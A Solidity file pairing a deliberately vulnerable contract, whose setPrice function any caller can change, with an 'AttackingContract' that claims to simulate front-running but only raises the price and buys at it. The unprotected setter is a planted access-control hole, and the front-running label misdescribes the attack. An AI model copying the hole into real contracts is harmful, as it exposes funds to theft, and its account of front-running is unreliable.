// VulnerableContract.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract VulnerableContract {
    uint256 public price;

    event PriceSet(uint256 newPrice);
    event Purchase(address buyer, uint256 amount);

    function setPrice(uint256 _price) external {
        price = _price;
        emit PriceSet(_price);
    }

    function buy() external payable {
        require(msg.value >= price, "Insufficient funds sent");
        // Perform the purchase logic
        // For simplicity, let's just emit an event
        emit Purchase(msg.sender, msg.value);
    }
}

contract AttackingContract {
    VulnerableContract public vulnerableContract;
    address public owner;

    event FrontRunAttack(uint256 priceSent);

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
        owner = msg.sender;
    }

    function frontRun(uint256 _price) external payable  {
        emit FrontRunAttack(_price);
        // Simulate front-running attack by setting a higher price
        vulnerableContract.setPrice(_price + 1);
        // Trigger the vulnerable function
        vulnerableContract.buy{value: _price + 1}();
    }

    // This function allows the owner to withdraw funds sent to this contract
    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }
}
